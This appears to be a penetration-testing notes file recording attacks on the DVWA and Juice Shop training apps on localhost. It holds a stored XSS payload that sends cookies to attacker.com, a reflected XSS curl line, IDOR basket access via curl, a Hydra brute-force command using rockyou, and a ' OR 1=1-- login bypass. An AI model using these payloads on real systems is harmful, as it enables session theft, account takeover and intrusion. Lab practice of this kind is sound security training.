# Security Findings
## DVWA → XSS (Stored)
### Every time anyone visits this page, the script executes.

    ``` 
    <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
    <script>alert('XSS-KAVACH-STORED')</script>
    
    ``` 

## DVWA → XSS (Reflected)
###
    curl -b cookies.txt \
    "http://localhost:8080/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>"
    
## IDOR / Broken Access Control (Juice Shop)
### The attack:

                Register two accounts — user A and user B
                Login as user A
                Go to your basket — notice the URL or API call uses a basket ID number
                Open browser Developer Tools → Network tab
                Add something to your basket
                Look for the API call: GET /rest/basket/1 or similar
                Change the number to 2 (user B's basket ID)

### Using curl:
               # Login and get JWT token
              curl -X POST http://localhost:3000/rest/user/login \
                -H "Content-Type: application/json" \
                -d '{"email":"userA@test.com","password":"Test1234!"}' \
                | grep token
                
                # Access another user's basket (change the ID number)
                curl -H "Authorization: Bearer YOUR_TOKEN_HERE" \
                  http://localhost:3000/rest/basket/2

## Authentication Failures (DVWA)
### The attack — brute force login with Hydra:
    # Install Hydra if not present
      sudo apt install hydra -y
      
    # Brute force DVWA login
      hydra -l admin -P /usr/share/wordlists/rockyou.txt \
        localhost http-get-form \
        "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=YOUR_SESSION_ID; security=low"

    # Login multiple times and capture the session tokens
    # Show they are predictable or not rotated after login
    curl -v -d "username=admin&password=password&Login=Login" \
      http://localhost:8080/login.php 2>&1 | grep "Set-Cookie"


### For Juice Shop — SQL injection in login
    In the Juice Shop login page, email field type:
    ' OR 1=1--
    Password: anything
    This logs you in as the first user in the database (admin) without knowing the password — this counts as both injection AND authentication failure.

### Security Misconfiguration (Juice Shop) 
    The attack — exposed admin page:
    # The admin panel has no proper access control
      curl http://localhost:3000/#/administration
      #Browse to http://localhost:3000/#/administration while logged in as a regular user — you can access admin functions.

    Exposed API endpoints:
    # Juice Shop exposes its entire API documentation
      curl http://localhost:3000/api-docs
      This reveals all API endpoints — a serious information disclosure.
